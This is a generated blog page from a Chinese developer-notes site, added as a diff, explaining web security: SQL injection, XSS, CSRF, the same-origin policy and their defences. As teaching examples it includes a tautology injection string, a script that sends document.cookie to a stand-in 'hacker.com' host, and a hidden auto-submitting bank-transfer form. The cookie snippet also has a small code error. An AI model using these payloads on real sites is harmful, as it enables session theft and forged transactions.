@@ -1,0 +1,246 @@
+
+<!DOCTYPE html>
+<html lang="">
+
+
+  <head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="theme-color" content="#202020">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+
+    
+        <meta name="keywords" content="">
+        
+
+          
+              <meta name="description" content="Web安全">
+              
+
+                <link rel="icon" type="image/x-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAAEzo7pQAAACzVBMVEXHx8fLy8vMzMzNzc3Ozs7Pz8/Q0NDR0dHS0tLT09PU1NTV1dXW1tbX19fY2NjZ2dna2trb29vc3Nzd3d3e3t7f39/g4ODh4eHi4uLj4+Pk5OTl5eXm5ubn5+fo6Ojp6enq6urr6+vs7Ozt7e3y8vL09PT19fX29vb39/f4+Pj6+vr9/f3+/v7////Ozs7Pz8/Q0NDS0tLU1NTW1tbX19fY2NjZ2dna2trb29vc3Nzd3d3e3t7S0tLV1dXZ2dna2trc3NzY2Njc3Nzj4+PV1dXT09PX19fZ2dnc3NzU1NTU1NTY2Nji4uLS0tLS0tLW1tbU1NTf39/Hx8fT09PJycnIyMjDw8PGxsbHx8fBwcHFxcXf39/JycnS0tK8vLy3t7fBwcG4uLi8vLzCwsKwsLCioqKhoaGdnZ2ZmZmbm5uXl5ehoaGZmZmPj4+ampqJiYmVlZWGhoaDg4OSkpKFhYWAgICQkJB2dnZ9fX16enp4eHh0dHRvb29ycnJ1dXVra2tubm5tbW1eXl5paWllZWVkZGR4eHhYWFhcXFxaWlpbW1tOTk5NTU1MTExOTk5QUFBISEhgYGBEREQ3NzdBQUFISEhCQkJBQUE0NDQ6Ojo2NjY2NjYxMTEzMzMnJycwMDApKSkrKysZGRkpKSkTExMVFRUfHx8gICAiIiItLS0cHBwdHR0lJSUZGRkiIiIdHR0XFxcjIyMREREiIiIAAAABAQEDAwMEBAQGBgYHBwcICAgJCQkKCgoLCwsMDAwNDQ0ODg4PDw8QEBARERESEhITExMUFBQVFRUWFhYXFxcYGBgZGRkaGhobGxscHBwdHR0eHh4fHx8gICAhISEiIiIjIyMkJCQmJiYnJycoKCgrKyssLCwwMDAxMTE3NzdDQ0NLS0tPT09WVlZZWVlkZGRoaGhra2tsbGxzc3N2dnZ9fX2BgYGNjY2Pj4+dnZ1edkJeAAAAtHRSTlMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQEBAQEBAQEBAQEBAQECAgICAgMDAwQFBggICQoKDA4QEBMUFhYYGRocHB8hIiMkKSw1ODg9RkpOUFNVV1lmaGtsbnFydHd5eYWHiImMj4+Sk5OVlpuipKaqq622v8DBwsPHyMzOz9HS1NXb3uDm5ujq7Ozw8fLy8vLy8vP09vf6+/z8/v5Qqz//AAADDklEQVQYGW3BS2icVRgG4Pf9zvnnkpnMJZPr5GpMa6NISJTEpolaSRG7KBVBcCMIRRAEleJWXbtyobgTFVwILtyIWbltSw2VSK01KcQ0pdGZZEybmT//zH/OZyKNi+jzQCZNYJP3Pn6c6StKOQPCSHbcIv3LUs6WelzBfOt2rzKL/rhkandoZt/vBvQZsQvdIDjPi68SgNaNYCo+vl1uN5nEJ8uprq7fxUnyvbMfibPRKz0YwuRlSZzfzHbVzlhrBmV3t+hPyLChApXALAoJ9GaYAlQGclaoyt9AkyBN6bNTi5ubOv36zqqzFpDXOkpfAdDbv6JprPZ8OQ3bklYrkR+9XJdW67mc2g0LKQlGTxpr5ppK1weYOlC/5M3why8YPMBq9Kd5d8LjkJamyxSAE7reOCY3wz4STAEoxKMGVPhbgLWAuZD5tKzWVTQCxHsfdJx+tnpntfHB552gVdDF7RfeWNqbGPkh9LAB0POoK2CeqK+F6qUeZt8eAUBATpUFkkqdf9K7HZGGIjtIFY8M0Te+Uyvn0fF8KhBXeCrA+vVcWtaA7rSz2ugAUikE20VlGBmZya4pACVIvT3UtPm5SRyKw7as7ToteECl8+48vxsA8a/1r8WQOERNe7bhgEJwgiIQelVAVqE2wD624QAlPde9qJ0BSECJ1gofvgECzOAfiY43H/FXv/kDYwCo98Ynoi8asQJWsE8FaHLM9mxUvw87G0/nX4oGVlZ+3HIe1uOALw53pqNyWcKXEZlCIrC3lpe3lULTJiLHtx+authdBKA2k8m3BwIn/n5tz6kajWMXz7wz1Z+ga1kcYjL21xuIYQJCumYeKwN/9ecsQxP7nIQWyGXSa3ugCWh6zy30WoBIaTWJrbFMEjsBlFqvNCIbQ3brYdMQiVYFaaBvo5LPtSkZ1u43JG2DlhGxhgBB7HNBGQ6EBIVs0HB2Nti7lmw6JY6IuLx07BptdvnsW4UicYQi+mnL3Jjd44sLI0OKo5SgbsqlKz+bc0+Uif8gVCVbnTwZ28FqDf9HSc+bUf1vzMAvsrtVWjkAAAAASUVORK5CYII=">
+                <title>
+                  Web安全 [ 开发笔记 ]
+                </title>
+                
+                  <!-- stylesheets list from config.yml -->
+                  
+                    <link rel="stylesheet" href="/css/microb.css">
+                    
+                      
+  </head>
+
+<body>
+  <div class="container" id="content-outer">
+    <div class="inner" id="content-inner">
+        <div class="tab">
+            <a href="/"><img src="/left.png" /></a>
+            <span><a href="/">开发笔记</a></span>
+            <!-- <span><a class="tab-search" href="/search/">搜索</a></span> -->
+            
+              <span><a class="tab-title" id="#Browser" href="/#Browser">Browser</a></span>
+            
+              <span><a class="tab-title" id="#Bug" href="/#Bug">Bug</a></span>
+            
+              <span><a class="tab-title" id="#CSS" href="/#CSS">CSS</a></span>
+            
+              <span><a class="tab-title" id="#HTML" href="/#HTML">HTML</a></span>
+            
+              <span><a class="tab-title" id="#HTTP" href="/#HTTP">HTTP</a></span>
+            
+              <span><a class="tab-title" id="#JS" href="/#JS">JS</a></span>
+            
+              <span><a class="tab-title" id="#LeetCode" href="/#LeetCode">LeetCode</a></span>
+            
+              <span><a class="tab-title" id="#NodeJS" href="/#NodeJS">NodeJS</a></span>
+            
+              <span><a class="tab-title" id="#Other" href="/#Other">Other</a></span>
+            
+              <span><a class="tab-title" id="#Work" href="/#Work">Work</a></span>
+            
+              <span><a class="tab-title" id="#随笔" href="/#随笔">随笔</a></span>
+            
+          </div>
+      
+  <div id="toc" class="toc-article">
+    <!--<strong class="toc-title">目录</strong>-->
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-sql注入"><span class="toc-text">1. sql注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-XSS脚本攻击"><span class="toc-text">2. XSS脚本攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-如何注入恶意脚本"><span class="toc-text">2.1 如何注入恶意脚本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-如何阻止攻击"><span class="toc-text">2.2 如何阻止攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-CSRF跨站脚本伪造"><span class="toc-text">3. CSRF跨站脚本伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#3-1-CSRF攻击行为"><span class="toc-text">3.1 CSRF攻击行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-2-防止CSRF攻击"><span class="toc-text">3.2 防止CSRF攻击</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-同源策略"><span class="toc-text">4. 同源策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-https"><span class="toc-text">5. https</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考资料"><span class="toc-text">参考资料</span></a></li></ol>
+  </div>
+
+
+<div class="section">
+  <article class="post" id="post">
+    <header class="post-header text-center">
+      <h1 class="title">
+        Web安全
+      </h1>
+      
+      <time class="time" datetime="2019-02-16T09:57:46.000Z">
+        2019-02-16
+      </time>
+      
+      <hr>
+    </header>
+    <div class="post-content">
+      <blockquote>
+<p>浏览器安全可以分为三大块——Web 页面安全、浏览器网络安全和浏览器系统安全。</p>
+</blockquote>
+<h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1. sql注入"></a>1. sql注入</h3><p>通过把sql命令插入到web表单提交，或输入域名/页面请求的查询字符串，最终达到欺骗服务器执行恶意sql命令。</p>
+<p>变量id是一个从用户界面传来的值<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string sql = " <span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'" + id + "'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></p>
+<p>ID值: <em><code>1&#39; OR &#39;1&#39; = &#39;1</code></em><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">id</span>, <span class="keyword">name</span>, age</span><br><span class="line"><span class="keyword">FROM</span> <span class="keyword">users</span></span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'1'</span> <span class="keyword">OR</span> <span class="string">'1'</span> = <span class="string">'1'</span></span><br></pre></td></tr></table></figure></p>
+<p>从users表中的所有数据都查询出来，仅仅通过一个简单的恒真表达式。</p>
+<h3 id="2-XSS脚本攻击"><a href="#2-XSS脚本攻击" class="headerlink" title="2. XSS脚本攻击"></a>2. XSS脚本攻击</h3><p>黑客通过”HTML注入”篡改网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p>
+<h4 id="2-1-如何注入恶意脚本"><a href="#2-1-如何注入恶意脚本" class="headerlink" title="2.1 如何注入恶意脚本"></a>2.1 如何注入恶意脚本</h4><p>一旦你浏览已经被黑客留下XSS script的页面，这段js就会执行，cookie信息就会被偷走。黑客可以假冒你的身份做事情了。</p>
+<p>如果页面被注入恶意js脚本，可以做：</p>
+<ul>
+<li>窃听cookie：通过<code>document.cookie</code>获取cookie信息，发送给恶意服务器</li>
+<li>监听用户行为：通过<code>addEventListener</code>监听键盘时间，发送给恶意服务器</li>
+<li>修改DOM：伪造假的登录窗口，欺骗用户的用户名和密码</li>
+<li>在页面内生成浮窗广告</li>
+</ul>
+<p>将一段恶意JS代码提交到数据库，用户请求包含恶意js脚本的数据，并注入页面。</p>
+<p>某个黑客发表了一篇文章，在<code>&lt;input&gt;</code>框中输入一段script<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span> src=<span class="string">"http://hacker.com/hack.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></p>
+<p>hack.js文件中的内容<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">img.src = <span class="string">"http://hacker.com/log?"</span> + <span class="built_in">escape</span>(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br></pre></td></tr></table></figure></p>
+<h4 id="2-2-如何阻止攻击"><a href="#2-2-如何阻止攻击" class="headerlink" title="2.2 如何阻止攻击"></a>2.2 如何阻止攻击</h4><ul>
+<li><p>对关键字符转码</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 转码前</span></span><br><span class="line">code:<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">'你被xss攻击了'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 转码后</span></span><br><span class="line">code:&amp;lt;script&amp;gt;alert(&amp;#39;你被xss攻击了&amp;#39;)&amp;lt;/script&amp;gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>用<code>HttpOnly</code>保护<code>Cookie</code>的安全</p>
+</li>
+<li>禁止执行内联脚本</li>
+<li>限制加载其他域下的资源</li>
+</ul>
+<h3 id="3-CSRF跨站脚本伪造"><a href="#3-CSRF跨站脚本伪造" class="headerlink" title="3. CSRF跨站脚本伪造"></a>3. CSRF跨站脚本伪造</h3><h4 id="3-1-CSRF攻击行为"><a href="#3-1-CSRF攻击行为" class="headerlink" title="3.1 CSRF攻击行为"></a>3.1 CSRF攻击行为</h4><p>黑客引诱用户打开黑客的网站，利用用户的登录状态发起跨站请求。</p>
+<ul>
+<li>自动发起GET请求</li>
+<li>自动发起POST请求</li>
+<li>引诱用户点击链接</li>
+</ul>
+<p>假设有个银行网站用以下方式进行转账操作<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.bank.com/transfer.php?toBankId=&lt;账号&gt;&amp;money=&lt;金额&gt;</span><br></pre></td></tr></table></figure></p>
+<p>你打开浏览器，先登录了银行网站，然后又开了一个tab页，打开了你的邮箱，有这么一个邮件：恭喜你获得了一台iphone x,点击领取。点击了上面的链接，就执行了转账操作。</p>
+<p>后来银行转账功能不用<code>get</code>， 改用<code>post</code>。 </p>
+<p>黑客也做了改进，建立了一个偷偷提交数据的页面。用户进入该页面，会自动提交表单。若用户已经登录了<code>www.bank.com</code>，请求成功。</p>
+<p>从头到尾，攻击网站都没有获取到过cookie， 都是通过浏览器间接实现（利用web的cookie隐式身份验证机制），所以<code>httpOnly</code>并不会影响这个攻击。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display:</span>'<span class="attr">none</span>'&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://www.bank.com/transfer.php"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankId"</span> <span class="attr">value</span>=<span class="string">"123"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"money"</span> <span class="attr">value</span>=<span class="string">"10000"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">steal</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">      iframe = <span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="javascript">      iframe.document.submit(<span class="string">"transfer"</span>);</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="3-2-防止CSRF攻击"><a href="#3-2-防止CSRF攻击" class="headerlink" title="3.2 防止CSRF攻击"></a>3.2 防止CSRF攻击</h4><ul>
+<li>如果是第三方站点发起的请求，禁止发送某些关键Cookie数据到服务器<br><code>Set-cookie</code>请求头带上<code>SameSite</code>: Strict, Lax, None</li>
+<li>检查Referer, Origin请求头: 根据地址判断是否接受请求</li>
+<li>CSRF Token: 在浏览器向服务器发起请求时，服务器生成一个 CSRF Token，该字符串植入到返回的页面中。如果要发起转账，就要带上CSRF Token</li>
+</ul>
+<h3 id="4-同源策略"><a href="#4-同源策略" class="headerlink" title="4. 同源策略"></a>4. 同源策略</h3><p>如果两个 URL 的协议、域名和端口都相同，我们就称这两个 URL 同源。</p>
+<ul>
+<li>DOM层面<br>限制了来自不同源的 JavaScript 脚本对当前 DOM 对象读和写的操作。</li>
+<li>数据层面<br>限制了不同源的站点读取当前站点的 Cookie、IndexDB、LocalStorage 等数据。</li>
+<li>网络层面<br>限制了通过 XMLHttpRequest 等方式将站点的数据发送给不同源的站点。</li>
+</ul>
+<p>但同时：</p>
+<ul>
+<li>页面中可以嵌入第三方资源</li>
+<li>CSP &amp; CORS: 让服务器决定浏览器能够加载哪些资源，让服务器决定浏览器是否能够执行内联 JavaScript 代码。</li>
+</ul>
+<h3 id="5-https"><a href="#5-https" class="headerlink" title="5. https"></a>5. https</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul>
+<li><a href="https://cloud.tencent.com/developer/article/1004895" target="_blank" rel="noopener">简单的 web 安全 checklist</a></li>
+<li>码农翻身-web安全</li>
+<li>《图解HTTP》第11章 Web的攻击技术</li>
+</ul>
+
+    </div>
+  </article>
+    <!-- 
+    <div class="post-nav">
+      <div class="post-nav-item post-nav-next">
+        
+          <span>〈 </span>
+          <a href="/2019/02/16/从session到token/" rel="next" title="Session, token与OAuth">
+          Session, token与OAuth
+          </a>
+        
+      </div>
+  
+      <div class="post-nav-item post-nav-prev">
+        
+          <a href="/2019/02/16/ASCII，Unicode和UTF-8/" rel="prev" title="字符集和字符编码">
+            字符集和字符编码
+          </a>
+          <span>〉</span>
+        
+      </div>
+    </div>
+   -->
+</div>
+
+
+<script>
+var link = document.getElementsByClassName('toc-link');
+var hash = decodeURIComponent(location.hash);
+if (hash){
+} else {
+  link[0].classList.add('toc-link-active');
+}
+
+var h3 = document.getElementsByTagName('h3');
+var h4 = document.getElementsByTagName('h4');
+var h5 = document.getElementsByTagName('h5');
+var link_arr = [];
+function addToArr(arr){
+  for(var i = 0; i < arr.length; i++){
+    link_arr.push(arr[i].offsetTop);
+  }
+}
+addToArr(h3);
+addToArr(h4);
+addToArr(h5);
+
+
+var compare = function (x, y) {
+    if (x < y) {
+        return -1;
+    } else if (x > y) {
+        return 1;
+    } else {
+        return 0;
+    }
+}
+
+link_arr.sort(compare);
+
+
+window.onscroll = function(){
+  var height = document.documentElement.scrollTop;
+  for (var i = 0; i < link_arr.length; i++){
+    if (link_arr[i] > height){
+      for(var j = 0; j < link.length; j++){
+        link[j].classList.remove('toc-link-active');
+      }
+      document.getElementsByClassName('toc-link')[i].classList.add('toc-link-active');
+      break;
+    } 
+  }
+}
+
+</script>
+    </div>
+  </div>
+   
+
+<script src="/js/pangu.js"></script>
+
+<script>
+  document.addEventListener("DOMContentLoaded", () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+
+  // window.addEventListener("load", event => {
+  //   // 判断浏览器是否支持
+  //   if ("serviceWorker" in navigator) {
+  //     window.navigator.serviceWorker
+  //       .register("/sw.js", {
+  //         scope: "/"
+  //       })
+  //   }
+  // });
+</script>
+
+</body>
+</html>
+
